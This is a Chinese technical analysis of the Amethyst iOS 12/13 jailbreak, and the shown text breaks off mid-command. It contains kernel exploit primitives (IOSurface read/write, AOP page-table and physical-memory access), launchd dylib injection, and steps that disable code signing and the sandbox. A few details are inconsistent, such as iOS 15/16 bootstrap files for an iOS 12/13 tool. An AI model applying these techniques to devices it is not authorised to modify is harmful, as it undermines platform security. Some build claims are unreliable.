# Amethyst iOS 越狱项目完整技术分析

> 本文档对 Amethyst（iOS 12 / 13 全设备越狱）项目进行完整技术剖析，涵盖漏洞利用原理、编译环境要求、Xcode/SDK 配置、launchd handoff 流程，以及「Jailbreak Failed — Failed to handoff the jailbreak server to launchd」错误的根因定位与修复方案。

---

## 目录

1. [项目概览](#1-项目概览)
2. [目录结构](#2-目录结构)
3. [编译环境要求（Xcode / SDK / 工具链）](#3-编译环境要求xcode--sdk--工具链)
4. [漏洞利用原理](#4-漏洞利用原理)
5. [Launchd Handoff 完整流程](#5-launchd-handoff-完整流程)
6. [Jailbreak Failed 错误根因分析](#6-jailbreak-failed-错误根因分析)
7. [重新编译完整步骤](#7-重新编译完整步骤)
8. [常见编译错误与解决方案](#8-常见编译错误与解决方案)
9. [关键技术细节](#9-关键技术细节)
10. [参考资料](#10-参考资料)

---

## 1. 项目概览

| 项目 | 说明 |
|------|------|
| **名称** | Amethyst |
| **支持系统** | iOS 12.0 – 13.x（所有设备 A7 – A13） |
| **支持设备** | iPhone 5s (A7) 至 iPhone 11 (A13)；iPad 同代 SoC |
| **越狱类型** | Rootless + RootFS Remount（半不完美，重启后需重新触发） |
| **作者** | staturnz（主开发）、Alfie CG（Trigon 漏洞）等 |
| **仓库结构** | 主 App（Amethyst.xcodeproj） + basebins（C 工具集） |

**核心架构**：
- **Amethyst.app**：UI 入口，承载漏洞触发与流程编排
- **basebins**：jbutil / launchd_hook.dylib / base_hook.dylib / libjailbreak.dylib，作为 jailbreak 守护组件注入系统

---

## 2. 目录结构

```
Amethyst/
├── Amethyst/                       # 主 Xcode 工程
│   ├── Amethyst.xcodeproj/         # Xcode 工程配置
│   ├── buildipa.sh                 # 一键编译 IPA 脚本
│   ├── Amethyst/                   # App 源码
│   │   ├── AppDelegate.m           # 入口 / 配置 / Trigon 缓存
│   │   ├── exploit/
│   │   │   ├── hemlock/            # A12/A13 内核漏洞（IOSurface UAF）
│   │   │   └── trigon/             # A7–A11 内核漏洞（AOP 硬件漏洞）
│   │   ├── jailbreak/
│   │   │   ├── jailbreak.c         # 越狱主流程编排
│   │   │   ├── handoff.c           # launchd handoff 实现
│   │   │   ├── trustcache.c        # 静态/动态 TrustCache 操作
│   │   │   ├── remount.c           # RootFS 重挂载/快照回退
│   │   │   ├── ppl.c               # PPL 绕过（A12+）
│   │   │   ├── dma.c               # DMA 原语
│   │   │   ├── dyld.c              # dyld patch
│   │   │   ├── patchfinder.c       # 内核符号查找
│   │   │   └── ...
│   │   └── ui/                     # 主界面
│   └── bootstrap-1500.tar.lzfse    # Procursus Bootstrap (iOS 15)
│   └── bootstrap-1600.tar.lzfse    # Procursus Bootstrap (iOS 16)
└── basebins/                       # 注入工具集
    ├── Makefile                    # 顶层构建脚本
    ├── jbutil/                     # 越狱工具主程序（注入、安装、重启）
    ├── launchd_hook/               # 注入到 launchd 的 dylib（jbserver XPC）
    ├── base_hook/                  # 通用进程 hook（注入到所有进程）
    ├── libjailbreak/               # 客户端库（libjailbreak.dylib）
    └── common/                     # 共享代码
```

---

## 3. 编译环境要求（Xcode / SDK / 工具链）

### 3.1 必需工具

| 工具 | 版本 | 用途 | 安装方式 |
|------|------|------|----------|
| **Xcode** | **14.0 – 14.3**（推荐 14.2） | 编译主 App 与 basebins | Mac App Store / Apple Developer |
| **Command Line Tools** | 与 Xcode 一致 | clang / xcrun | `xcode-select --install` |
| **iPhoneOS SDK** | iOS 16.x SDK（随 Xcode 14 自带） | 提供私有框架头 | Xcode 内嵌 |
| **ldid** | 2.x+ | iOS 代码签名（伪签名） | `brew install ldid` |
| **dpkg-deb** | 1.20+ | 构建 .deb 包 | `brew install dpkg` |
| **llvm-objcopy** | 14.x+ | 提取 shellcode 段 | `brew install llvm` |
| **lzfse / libcompression** | 系统自带 | bootstrap 解压 | macOS 内置 |

> ⚠️ **Xcode 版本关键**：项目 `project.pbxproj` 中 `LastUpgradeCheck = 1340`（即 Xcode 13.4），但 basebins 的 Makefile 大量使用 `-arch arm64e`，必须用 Xcode 14+ 才能正确编译 fat binary（arm64 + arm64e）。Xcode 15+ 也可，但需注意 iOS 17 SDK 部分私有头文件变化。

### 3.2 主 App 编译配置（Amethyst.xcodeproj）

来自 [project.pbxproj](file:///workspace/Amethyst/Amethyst.xcodeproj/project.pbxproj)：

```xml
// 项目级（Debug/Release 共用）
IPHONEOS_DEPLOYMENT_TARGET = 15.5;   // 项目级最低版本
SDKROOT = iphoneos;

// Target 级（Amethyst target）
ARCHS = arm64;                        // 主 App 只编译 arm64（可在 A12+ 上以 arm64 模式跑）
IPHONEOS_DEPLOYMENT_TARGET = 12.0;    // Target 降到 12.0，覆盖 iOS 12/13
CODE_SIGN_IDENTITY = "Apple Development";
CODE_SIGN_STYLE = Manual;
OTHER_LDFLAGS = (
    "-framework", "IOSurface",        // Hemlock 漏洞所需
    "-framework", "IOKit",            // 内核 IO 服务访问
);
PRODUCT_BUNDLE_IDENTIFIER = com.staturnz.amethyst;
TARGETED_DEVICE_FAMILY = "1,2";       // iPhone + iPad
```

### 3.3 basebins 编译配置

所有 basebins 共用模板（见 [basebins/jbutil/Makefile](file:///workspace/basebins/jbutil/Makefile)、[basebins/launchd_hook/Makefile](file:///workspace/basebins/launchd_hook/Makefile) 等）：

```makefile
CC      = $(shell xcrun --sdk iphoneos --find clang)
STRIP   = $(shell xcrun --sdk iphoneos --find strip)
SDK     = $(shell xcrun --sdk iphoneos --show-sdk-path)
LDID    = $(shell which ldid)

CFLAGS := -I./include -isysroot $(SDK) \
          -mios-version-min=12.0 \
          -arch arm64e -arch arm64 \
          -Werror -Wall -Wno-unused-variable -Wno-unused-function \
          -fvisibility=hidden -fvisibility-inlines-hidden

LDFLAGS := -L$(SDK)/usr/lib -lc -lSystem ...
```

**关键点**：
1. **`-mios-version-min=12.0`**：所有 basebins 必须支持 iOS 12.0+ 起步运行
2. **`-arch arm64e -arch arm64`**：fat binary，arm64e 给 A12+ 设备的 launchd 用，arm64 给 A11 及以下设备用
3. **`ldid -S` 或 `ldid -Sents.xml`**：用 ldid 进行伪签名，注入 trustcache 后即可执行
4. **`-fvisibility=hidden`**：默认隐藏符号，仅导出 `BASEBIN_EXPORT` 标记的函数

### 3.4 编译产物与依赖关系

```
basebins/
├── jbutil                    # 可执行程序（fat: arm64 + arm64e）
├── launchd_hook.dylib        # 动态库（fat: arm64 + arm64e）
├── base_hook.dylib           # 动态库（fat: arm64 + arm64e）
├── libjailbreak.dylib        # 客户端库（fat: arm64 + arm64e）
└── basebins.tar              # 通过 `make package` 打包，作为 Amethyst.app 资源
```

`basebins.tar` 会被 Xcode 作为 Resources 嵌入 `Amethyst.app`，运行时由 `jailbreak_handoff()` 解包到 `/`：

```xml
<!-- project.pbxproj -->
2FC7DEE12F91977A0076631F /* basebins.tar */ = {
    isa = PBXFileReference;
    lastKnownFileType = archive.tar;
    name = basebins.tar;
    path = ../../basebins/basebins.tar;
    sourceTree = "<group>";
};
```

---

## 4. 漏洞利用原理

Amethyst 包含两条独立的内核漏洞利用链，根据 CPU 自动选择：

### 4.1 漏洞选择逻辑

来自 [AppDelegate.m](file:///workspace/Amethyst/Amethyst/AppDelegate.m#L17-L21)：

```objc
sysctlbyname("hw.cpufamily", &cpu, &size, NULL, 0);
self.trigonSupported = !(cpu == CPUFAMILY_ARM_VORTEX_TEMPEST ||     // A12
                         cpu == CPUFAMILY_ARM_LIGHTNING_THUNDER);   // A13
self.exploit = self.trigonSupported ? Exploit_Trigon : Exploit_Hemlock;
```

| CPU | 设备示例 | 默认漏洞 |
|-----|----------|----------|
| A7 (Cyclone) | iPhone 5s, iPad Air | Trigon |
| A8 (Typhoon) | iPhone 6, iPad mini 4 | Trigon |
| A9 (Twister) | iPhone 6s, iPad (2017) | Trigon |
| A10 (Hurricane) | iPhone 7 | Trigon |
| A11 (Monsoon/Mistral) | iPhone 8/X | Trigon |
| **A12 (Vortex/Tempest)** | iPhone XS/XR | **Hemlock** |
| **A13 (Lightning/Thunder)** | iPhone 11 | **Hemlock** |

### 4.2 Hemlock 漏洞（A12/A13）

源码：[exploit/hemlock/hemlock.c](file:///workspace/Amethyst/Amethyst/exploit/hemlock/hemlock.c)

**原理**：基于 IOSurface 的 UAF（Use-After-Free）漏洞，结合 `puaf_physpuppet` 风格的页表项伪造。

**关键流程**：

1. **分配物理页**：通过 `vm_allocate` 分配大量 `VM_FLAGS_PURGABLE` 内存作为 src/dest
2. **遍历页表**：扫描虚拟地址空间，寻找可利用的页表项
3. **IOSurface UAF**：利用 `lock_result_t` 结构中的 `use_count` 与 `indexed_timestamp` 字段做越界读写

```c
// hemlock.c: 通过 IOSurface 实现的内核读写原语
uint32_t io_kread32(uint64_t addr) {
    if (addr == 0) return 0;
    lock_result_t *info = (lock_result_t *)hemlock->krw_object;
    uint64_t orig = info->use_count;
    
    info->use_count = addr - offsetof(lock_result_t, read_displacement);
    uint32_t value = io_get_use_count(hemlock->krw_client, hemlock->krw_surface);
    info->use_count = orig;
    return value;
}

void io_kwrite64(uint64_t addr, uint64_t value) {
    if (addr == 0) return;
    lock_result_t *info = (lock_result_t *)hemlock->krw_object;
    uint64_t orig = info->indexed_timestamp;
    info->indexed_timestamp = addr;
    io_set_indexed_timestamp(hemlock->krw_client, hemlock->krw_surface, value);
    info->indexed_timestamp = orig;
}
```

4. **建立 tfp0**：通过伪造 IPC port 获取 task_for_pid 0 等价的内核读写

**特点**：
- 不需要硬件漏洞，纯软件触发
- 在 A12/A13 上 PAC/PPL 已激活，需要配合 PPL bypass（见 [ppl.c](file:///workspace/Amethyst/Amethyst/jailbreak/ppl.c)）
- 编译时仅需 arm64（主 App），但注入到 launchd 时 launchd_hook.dylib 必须有 arm64e 切片

### 4.3 Trigon 漏洞（A7–A11）

源码：[exploit/trigon/trigon.c](file:///workspace/Amethyst/Amethyst/exploit/trigon/trigon.c)、[exploit/trigon/aop.c](file:///workspace/Amethyst/Amethyst/exploit/trigon/aop.c)

**原理**：基于 AOP（Audio On Processor）协处理器的硬件漏洞，与 Operation Triangulation 同源。

**关键流程**：

1. **映射 AOP 内存**：通过 IOKit 将 AOP 协处理器的物理内存映射到用户态

```c
// aop.c:144
int aop_init(void) {
    aop_info.base_pa = trigon->aop_base;
    aop_info.size = trigon->aop_size;
    aop_info.base_mapped = (uint8_t *)trigon_map_data(
        aop_info.base_pa, aop_info.size, 
        VM_PROT_READ | VM_PROT_WRITE);
    ...
}
```

2. **定位 AOP 内的 TTBR0/TTBR1**：通过特征码扫描找到 AOP 协处理器使用的页表基地址

```c
// aop.c:64 - 通过特征码定位 AOP info 结构
static uint8_t *aop_find_info_struct(void) {
    uint8_t bytes[] = {
        0x4F, 0xF0, 0x7F, 0xF5, // dsb sy
        0x1E, 0xFF, 0x2F, 0xE1, // bx lr
        0xFE, 0xFF, 0xFF, 0xEA  // b .
    };
    uint8_t *loc = memmem(aop_info.base_mapped, aop_info.size, bytes, sizeof(bytes));
    if (loc != NULL) return loc + sizeof(bytes);
    ...
}
```

3. **修改 AOP 页表项**：将受控物理页映射进 AOP 的地址空间，并修改 TTBR0 项为 RWX

```c
// aop.c:121 - 关闭 AOP 页表项的 PXN/PAN
static void aop_set_ttbr0_rwx(uint32_t ttbr0) {
    for (uint32_t i = 0; i < (0x1000 / 8); i++) {
        uint32_t desc_addr = ttbr0 + (i * 0x8);
        uint64_t desc = aop_read64(desc_addr);
        if (!desc || ((desc & 0x3) != 0x3)) continue;
        desc &= ~((uint64_t)(3 << 6));      // 清 APX/PXN
        desc &= ~((uint64_t)(1ULL << 54));  // 清 PXN
        desc &= ~((uint64_t)(1ULL << 53));  // 清 XN
        desc |= ((uint64_t)(1 << 10));      // 设 AF
        aop_write64(desc_addr, desc);
    }
}
```

4. **注入 shellcode 到 AOP**：将受控页映射为 AOP 可执行的代码，劫持目标函数

```c
// aop.c:183 - 注入命令通道
*(uint32_t *)(aop_info.shc_mapped + CMD_OFFSET) = AOP_CMD_READY;
*(uint32_t *)(aop_info.shc_mapped + OFFSET_OFFSET) = 0;
*(uint32_t *)(aop_info.shc_mapped + VALUE_OFFSET) = 0;
*(uint32_t *)(aop_info.shc_mapped + ORIG_ADDR_OFFSET) = aop_info.target_func;
*(uint32_t *)(aop_info.shc_mapped + TARGET_VA_OFFSET) = aop_info.target_va;
*(uint32_t *)(aop_info.shc_mapped + TARGET_PTE_OFFSET) = aop_info.target_pte;
```

5. **通过 AOP 间接读物理内存**：利用 AOP 协处理器读任意物理地址，绕过 PPL/PAN

```c
// aop.c:232 - 物理内存读
uint32_t aop_physread32(uint64_t pa) {
    aop_await_ready();
    aop_write64(aop_info.target_pte, (pa & ~0xFFF) | 0x403);
    *(volatile uint32_t *)(aop_info.shc_mapped + OFFSET_OFFSET) = (pa & 0xFFF);
    *(volatile uint32_t *)(aop_info.shc_mapped + VALUE_OFFSET) = 0;
    *(volatile uint32_t *)(aop_info.shc_mapped + CMD_OFFSET) = AOP_CMD_READ;
    usleep(80);
    aop_flush(aop_info.shc_mapped, 0x4000);
    aop_await_ready();
    return *(uint32_t *)(aop_info.shc_mapped + VALUE_OFFSET);
}
```

6. **内核基址定位**：通过三种方式（静态缓存 / AOP 探测 / IORVBAR 扫描）找到 kernel base

```c
// trigon.c:7
static int init_kbase(void) {
    switch (trigon->kbase_type) {
        case KBASE_TYPE_STATIC:  // 从 trigon cache 读取
        case KBASE_TYPE_AOP:     // 通过 AOP 扫描物理内存定位 MH_MAGIC_64
        case KBASE_TYPE_IORVBAR: // 从 IO 协处理器复位向量扫描
    }
}
```

**特点**：
- 利用硬件漏洞，稳定可靠
- 不受软件 mitigations（KTRR/PAN/PAC）影响
- Trigon 数据持久化在 `trigon.plist`，二次越狱更快

### 4.4 漏洞利用完成后的关键操作

来自 [jailbreak.c](file:///workspace/Amethyst/Amethyst/jailbreak/jailbreak.c#L294-L367)：

```
1. run_exploit()             # 触发漏洞，建立 tfp0
2. init_permissions()        # 把自己提权为 root (uid=0/gid=0)
3. run_kpf()                 # 通过 patchfinder 定位内核关键符号
   - gVirtBase / gPhysBase / gPhysSize
   - static_trustcache / dynamic_trustcache
   - ptov_table / cpu_ttep
4. 伪造 host_priv port       # 通过修改 ipc_port 的 ip_bits / ip_kobject
5. ppl_init()                # A12+ 需要 PPL bypass
6. trustcache_init()         # 初始化 trustcache 操作
7. remount_rootfs()          # APFS snapshot revert + remount RW
8. jailbreak_handoff()       # ★ 注入 launchd，建立 jbserver
9. patch_dyld()              # patch dyld 允许加载未签名 dylib
10. install_bootstrap()      # 安装 Procursus
11. userspace_reboot()       # 用户态重启
```

---

## 5. Launchd Handoff 完整流程

`jailbreak_handoff()` 是整个越狱链条中最关键的一步，**「Failed to handoff the jailbreak server to launchd」错误即来自此处**。

源码：[jailbreak/handoff.c](file:///workspace/Amethyst/Amethyst/jailbreak/handoff.c#L206-L252)

### 5.1 完整流程图

```
jailbreak_handoff()
│
├─ 1. extract_basebins()           # 解包 basebins.tar 到 /
│     └─ 提取: /amethyst/jbutil
│              /amethyst/launchd_hook.dylib
│              /usr/lib/base_hook.dylib
│              /usr/lib/libjailbreak.dylib
│
├─ 2. init_handoff_plist()         # 写入 /amethyst/handoff.plist
│     └─ 包含: kern_proc_addr, kern_task_addr, kernel_base, kernel_slide,
│              cpu_ttep, static_trustcache, dynamic_trustcache,
│              ptov_table, gPhysBase, gVirtBase, pplrw_entry 等
│
├─ 3. preload_basebin() × 4        # 预加载四个 basebin
│     │
│     ├─ trustcache_add_binary()   # 把 dylib/exec 的 cd_hash 加入动态 trustcache
│     ├─ chmod(path, 0755)         # 修正权限
│     ├─ posix_spawn + SIGKILL     # 非 dylib 通过启动后立即杀掉，触发 cs_blob 创建
│     └─ (PPL only) patch pmap_cs_entry.trust = 3   # A12+ 需要把 trust level 改为 3
│
├─ 4. jbserver_heartbeat() 检查    # 若已是 0x1337，说明已注入过，直接返回成功
│
├─ 5. 修改 launchd (pid=1) 权限
│     ├─ add_cs_flag(1, CS_VALID|CS_SIGNED|CS_GET_TASK_ALLOW|CS_DEBUGGED|
│     │               CS_PLATFORM_BINARY|CS_INVALID_ALLOWED)
│     ├─ remove_cs_flag(1, CS_HARD|CS_RESTRICT|CS_KILL|CS_REQUIRE_LV|
│     │                  CS_ENFORCEMENT|CS_FORCED_LV)
│     ├─ set_mac_slot(1, 1, 0)     # 关闭 sandbox
│     └─ (PPL only) ppl_write8(cs_enforced, 0)   # 关闭 launchd 的代码签名强制
│
├─ 6. chown/chmod /usr /usr/lib /usr/libexec   # 准备目录权限
│
└─ 7. 注入循环（最多 5 次）
      │
      ├─ inject_launchd_hook()
      │   └─ run_jbutil("--kickstart", NULL, true)
      │       └─ jbutil -k → inject_dylib(1, "/amethyst/launchd_hook.dylib")
      │           │
      │           ├─ injector_init(pid=1, path)
      │           │   ├─ process_init(1) → task_for_pid(1)
      │           │   ├─ process_find_image(_dlopen) → 找到 dlopen 地址
      │           │   ├─ process_find_symbol(_pthread_set_self)
      │           │   ├─ process_find_symbol(_pthread_create_from_mach_thread)
      │           │   └─ process_find_spin_gadget()   # 找 spin loop 地址
      │           │
      │           └─ inject_via_rop() 或 inject_via_shellcode()
      │               ├─ 在 launchd 进程内 alloc 一段栈 + 字符串
      │               ├─ thread_create + thread_set_state
      │               │   PC = pthread_set_self / pthread_create_from_mach_thread
      │               │   LR = spin_gadget (用于检测线程结束)
      │               ├─ thread_resume → 等待 PC == spin_gadget
      │               └─ 切换 PC = dlopen(path, RTLD_NOW) → 加载 dylib
      │
      └─ 10 次 heartbeat 检查（每次间隔 25ms）
          └─ 若 jbserver_heartbeat() == 0x1337 → 成功退出循环

返回：(jbserver_heartbeat() == 0x1337) ? 0 : -1
```

### 5.2 Heartbeat 协议

`jbserver_heartbeat()` 通过 XPC 向 launchd 发送命令 `JBSERVER_CMD_HEARTBEAT`：

```c
// handoff.c:55
jbserver_err_t jbserver_heartbeat(void) {
    xpc_object_t request = xpc_dictionary_create(NULL, NULL, 0);
    xpc_dictionary_set_uint64(request, "cmd", JBSERVER_CMD_HEARTBEAT);
    return jbserver_send_msg(request);
}
```

XPC 消息通过 `bootstrap_port` 发送到 launchd，被 `launchd_hook.dylib` 中的 hook 拦截：

```c
// launchd_hook/src/jbserver.c:350
static jbserver_err_t jbserver_heartbeat(xpc_object_t request, xpc_object_t reply) {
    return 0x1337;   // ← 这是「成功」标志
}
```

只要 `launchd_hook.dylib` 被加载并 hook 了 `xpc_serializer_unpack`（iOS 12）或 `xpc_receive_mach_msg`（iOS 13），就能拦截到心跳请求并返回 0x1337。

### 5.3 launchd_hook.dylib 的加载流程

来自 [launchd_hook/src/main.c](file:///workspace/basebins/launchd_hook/src/main.c#L168-L223)：

```c
__attribute__((constructor)) void ctor(void) {
    if (init_info() != 0) return;                    // 读取 handoff.plist
    if ((kinfo->self_proc_addr = find_proc_for_pid(getpid())) == 0) return;
    if ((kinfo->self_task_addr = find_task_for_pid(getpid())) == 0) return;
    if ((kinfo->self_port_addr = find_ipc_port(mach_task_self())) == 0) return;

    // 自己设置 platform binary 标志
    set_mac_slot(-1, kinfo->self_proc_addr, 1, 0);
    add_cs_flag(-1, kinfo->self_proc_addr, 
                CS_PLATFORM_PATH|CS_DEBUGGED|CS_INVALID_ALLOWED|CS_GET_TASK_ALLOW|CS_VALID);
    remove_cs_flag(-1, kinfo->self_proc_addr, 
                   CS_KILL|CS_HARD|CS_RESTRICT|CS_ENFORCEMENT|CS_REQUIRE_LV);

    // A12+: 关闭 cs_enforced 和设置 pmap_cs_entry trust level = 1
#ifdef __arm64e__
    ...
    if (kread8(self_pmap + koffsetof(pmap, cs_enforced)) == 1) {
        uint64_t pa = kvtophys(self_pmap + koffsetof(pmap, cs_enforced));
        if (pa != 0) ppl_write8(pa, 0);
        ...
    }
#endif

    if (trustcache_init() != 0) return;              // 初始化 trustcache 操作
    init_server();                                    // ★ 注册 jbserver XPC hook
    init_loader();                                    // 加载 tweak loader

    if (kinfo->first_run == 1) {
        kinfo->initialized = 1;                       // ★ 标记 jbserver 就绪
    } else {
        draw_splash_screen();
    }
}
```

只有当 `kinfo->initialized = 1` 被设置后，`xpc_serializer_unpack_hook` 才会处理 jbserver 请求：

```c
// launchd_hook/src/jbserver.c:425
static xpc_object_t xpc_serializer_unpack_hook(void *a1, void *a2, void *a3) {
    xpc_object_t message = xpc_serializer_unpack_orig(a1, a2, a3);
    if (message == NULL || kinfo->initialized == 0 || kinfo->userspace_rebooting == 1) {
        return message;   // ← 未初始化时直接透传，不响应 jbserver
    }
    return jbserver_handle_xpc_message(message);
}
```

---

## 6. Jailbreak Failed 错误根因分析

### 6.1 错误产生位置

错误来自 [jailbreak.c](file:///workspace/Amethyst/Amethyst/jailbreak/jailbreak.c#L364-L367)：

```c
ProgressLog(0.6f, "Applying Patches");
if (jailbreak_handoff() != 0) {
    reset_permissions();
    return JB_ERROR_HANDOFF;   // ← 这里
}
```

`jailbreak_handoff()` 返回 -1 的条件是：5 次注入尝试后 `jbserver_heartbeat() != 0x1337`。

### 6.2 可能的根因（按概率排序）

#### 根因 1：basebins 编译架构不匹配（最常见）

**现象**：在 A12/A13 设备上跑 Hemlock 漏洞成功，但 handoff 始终失败。

**原因**：
- launchd 在 A12/A13 上是 **arm64e** 架构（带 PAC）
- 若 `launchd_hook.dylib` 没有编译 arm64e 切片，dlopen 会因架构不匹配失败
- Makefile 中明确要求 `-arch arm64e -arch arm64`，但若：
  - Xcode 版本过低（< 14）不支持 arm64e 编译
  - 系统不在 Apple Silicon Mac 上（Intel Mac 无法编译 arm64e）
  - 手动改为单架构 `-arch arm64`

**验证方法**：
```bash
lipo -info basebins/launchd_hook/launchd_hook.dylib
# 期望输出: Architecture: arm64e arm64
# 若只有 arm64，则注入 A12+ launchd 必然失败
```

**修复**：
- 必须在 Apple Silicon Mac (M1/M2/M3) 上编译
- 使用 Xcode 14+，确保 clang 支持 arm64e target
- Makefile 中保持 `-arch arm64e -arch arm64`

#### 根因 2：ldid 签名缺失或失效

**现象**：basebins 解包到 `/` 后，`posix_spawn` 启动 jbutil 失败，或 dlopen launchd_hook.dylib 失败。

**原因**：
- AMFI 会校验代码签名，`ldid -S` 提供伪签名 + cdhash
- trustcache 中的 cdhash 必须与文件实际 hash 匹配
- 若编译时未执行 `ldid -S`，或 ldid 版本过旧（< 2.0），cdhash 计算错误

**验证方法**：
```bash
codesign -dvvv basebins/jbutil/jbutil
# 应看到 CodeSignature 的 CDHash

ldid -h basebins/launchd_hook/launchd_hook.dylib
# 应输出 hash + 类型
```

**修复**：
```bash
brew install ldid
# 确认 ldid 在 PATH 中
which ldid  # 应返回 /opt/homebrew/bin/ldid
```

#### 根因 3：PAC/PPL bypass 失败（A12/A13）

**现象**：Hemlock 漏洞成功建立 tfp0，但 `ppl_write8()` 无法修改 `cs_enforced`，导致 launchd_hook.dylib 被 AMFI 拒绝加载。

**原因**：
- A12+ 设备有 PPL（Page Protection Layer）保护，普通 kwrite 无法修改页表项
- `jailbreak_handoff()` 中关键步骤 `ppl_write8(kvtophys(task_pmap + koffsetof(pmap, cs_enforced)), 0)` 必须成功
- `dma_init()` / `ppl_init()` 任一失败都会导致后续注入失败

**验证方法**：
- 检查 [jailbreak.c](file:///workspace/Amethyst/Amethyst/jailbreak/jailbreak.c#L321-L331) 中 `ppl_init()` 返回值
- 若 `JB_ERROR_PPL` 早于 `JB_ERROR_HANDOFF` 出现，则根因在 PPL

**修复**：
- 检查 [dma.c](file:///workspace/Amethyst/Amethyst/jailbreak/dma.c) 与 [ppl.c](file:///workspace/Amethyst/Amethyst/jailbreak/ppl.c) 是否完整
- DMA 原语依赖 IOSurface，Hemlock 已建立，但若 SDK 版本不匹配可能导致 IOKit 函数符号缺失

#### 根因 4：jbutil 注入 launchd 失败

**现象**：`inject_launchd_hook()` 返回 0（注入「成功」），但 heartbeat 仍不为 0x1337。

**原因**：
- `inject_via_rop()` 通过 `thread_set_state` 设置 PC/SP/LR，要求：
  - `_pthread_set_self` 符号存在（libsystem_pthread.dylib）
  - `_pthread_create_from_mach_thread` 符号存在
  - `_dlopen` 符号存在（libdyld.dylib）
  - 找到合适的 `spin_gadget`（一段 spin loop 代码）
- 若 SDK 版本差异导致符号名变化（如 iOS 12.0 vs 12.1 vs 13.x），符号查找失败
- A12 + iOS 12.0 的特殊情况：[injector.c](file:///workspace/basebins/jbutil/src/injector.c#L339-L359) 会检测 VORTEX_TEMPEST + iOS 12 来决定 `disable_ptrauth`，若检测错误，PAC 签名错误导致 thread_set_state 失败

**验证方法**：
- 在设备上跑 `jbutil -k` 后用 `journalctl` / `syslog` 查看错误
- 注入失败时 `inject_via_rop` 会在 5 秒后超时（5000 × 1ms）

**修复**：
- 确保 basebins 编译时 SDK 与目标设备 iOS 版本兼容
- 在 [process.c](file:///workspace/basebins/jbutil/src/process.c) 中确认 `process_find_symbol` 能找到 `_pthread_set_self` 等符号
- 必要时打印 launchd 加载的 dyld 镜像列表，确认 libsystem_pthread.dylib 路径

#### 根因 5：handoff.plist 数据错误

**现象**：launchd_hook.dylib 加载成功，但 `init_info()` 读取 handoff.plist 失败，导致 `kinfo->initialized` 始终为 0。

**原因**：
- `init_handoff_plist()` 写入的内核偏移来自漏洞利用阶段的 `kinfo`
- 若 KASLR slide 计算错误，`kernel_base` / `cpu_ttep` 等地址错误
- launchd_hook.dylib 用这些错误地址读取内核数据会得到垃圾值，`trustcache_init()` 失败导致 ctor 提前 return

**验证方法**：
- 在 [handoff.c](file:///workspace/Amethyst/Amethyst/jailbreak/handoff.c#L88-L110) 写 plist 前打印 `kinfo->kern_proc_addr` / `kernel_base` 等
- 检查值是否合理（kernel_base 通常 0xFFFFFFF007000000+ 范围）

**修复**：
- 重新触发漏洞，确保 KASLR bypass 正确
- Trigon 模式下检查 `trigon.plist` 缓存是否过期（设备系统更新后缓存失效）

#### 根因 6：iOS 版本不匹配 offsets

**现象**：特定小版本（如 iOS 12.0 vs 12.1.4 vs 13.5）上失败。

**原因**：
- [jailbreak.c](file:///workspace/Amethyst/Amethyst/jailbreak/jailbreak.c#L121-L143) 中 offsets 是硬编码的，例如：
  ```c
  if (kinfo->version[0] == 12) {
      kinfo->offsets.pmap.cs_enforced = (kinfo->version[1] >= 1) ? 0x119 : 0x111;
      kinfo->offsets.task.bsd_info = (kinfo->protections.pac ? 0x368 : 0x358);
      ...
  }
  ```
- 若设备是 iOS 12.0（version[1]=0），但代码用了 0x119 而非 0x111，导致读取/写入错误地址

**修复**：
- 确认设备 iOS 子版本，检查 offsets 表是否覆盖
- 必要时添加新的版本分支

#### 根因 7：trustcache 已满

**现象**：第一次越狱成功，第二次失败。

**原因**：
- 动态 trustcache 槽位有限（V0 类型约 64 槽，V1 类型约 256 槽）
- `trustcache_find_slot()` 找不到 `0x41414141` 标记的空槽时返回 0
- `trustcache_add_binary()` 失败导致 basebins 未加入 trustcache，AMFI 拒绝加载

**验证方法**：
- 检查 `trustcache_add_binary` 返回值
- 通过 kread 检查 `tc_info->dynamic_count` 与已用槽位数

**修复**：
- 重启设备清空动态 trustcache
- 或在 [trustcache.c](file:///workspace/Amethyst/Amethyst/jailbreak/trustcache.c#L302-L323) 中实现 hash 复用机制

### 6.3 排查决策树

```
Jailbreak Failed: Failed to handoff the jailbreak server to launchd
│
├─ 设备是 A12/A13 (Hemlock)?
│   ├─ 是 → 检查 lipo -info launchd_hook.dylib 是否有 arm64e
│   │        ├─ 无 arm64e → 在 Apple Silicon Mac 上用 Xcode 14+ 重编译 ★最常见
│   │        └─ 有 arm64e → 检查 JB_ERROR_PPL 是否先发生
│   │
│   └─ 否 (A7-A11, Trigon) → 检查 trigon.plist 缓存
│
├─ jbutil 是否成功执行 -k?
│   ├─ 否 → 检查 ldid 签名 / chmod 权限 / trustcache 是否包含 jbutil hash
│   └─ 是 → 检查 launchd_hook.dylib 是否被 dlopen
│
├─ launchd_hook.dylib ctor 是否执行到 init_server()?
│   ├─ 否 → 检查 handoff.plist 数据是否正确（kernel_base 等）
│   │       检查 trustcache_init() 是否成功
│   │       检查 PPL bypass (cs_enforced 是否改为 0)
│   └─ 是 → 检查 kinfo->initialized 是否设为 1
│
└─ jbserver XPC 是否响应?
    ├─ 不响应 → 检查 xpc_serializer_unpack hook 是否生效 (iOS 12)
    │          检查 xpc_receive_mach_msg hook 是否生效 (iOS 13)
    └─ 响应 → 检查 heartbeat 是否返回 0x1337
```

---

## 7. 重新编译完整步骤

### 7.1 环境准备

```bash
# 必须在 Apple Silicon Mac (M1/M2/M3) 上
uname -m  # 应输出 arm64

# 安装 Xcode 14.2+ (从 Apple Developer 下载)
# https://developer.apple.com/xcode/

# 安装 Command Line Tools
xcode-select --install

# 安装依赖工具
brew install ldid dpkg llvm

# 验证
xcrun --sdk iphoneos --find clang
xcrun --sdk iphoneos --show-sdk-path
xcrun --sdk iphoneos --show-sdk-version  # 应 >= 16.0
which ldid llvm-objcopy dpkg-deb
```

### 7.2 编译 basebins

```bash
cd /workspace/basebins

# 清理旧产物
make clean

# 编译所有 basebins（jbutil / launchd_hook / base_hook / libjailbreak）
make all

# 验证架构
lipo -info jbutil/jbutil
# 期望: Architecture: arm64e arm64 (Universal)

lipo -info launchd_hook/launchd_hook.dylib
# 期望: Architecture: arm64e arm64

# 验证签名
ldid -h jbutil/jbutil
ldid -h launchd_hook/launchd_hook.dylib

# 打包成 basebins.tar（Amethyst.app 会嵌入）
make package

# 验证产物
ls -la basebins.tar
```

### 7.3 编译主 App

```bash
cd /workspace/Amethyst

# 方法 1: 用 buildipa.sh 一键打包
./buildipa.sh

# 方法 2: 手动 xcodebuild
xcodebuild clean build \
    CODE_SIGN_IDENTITY="" \
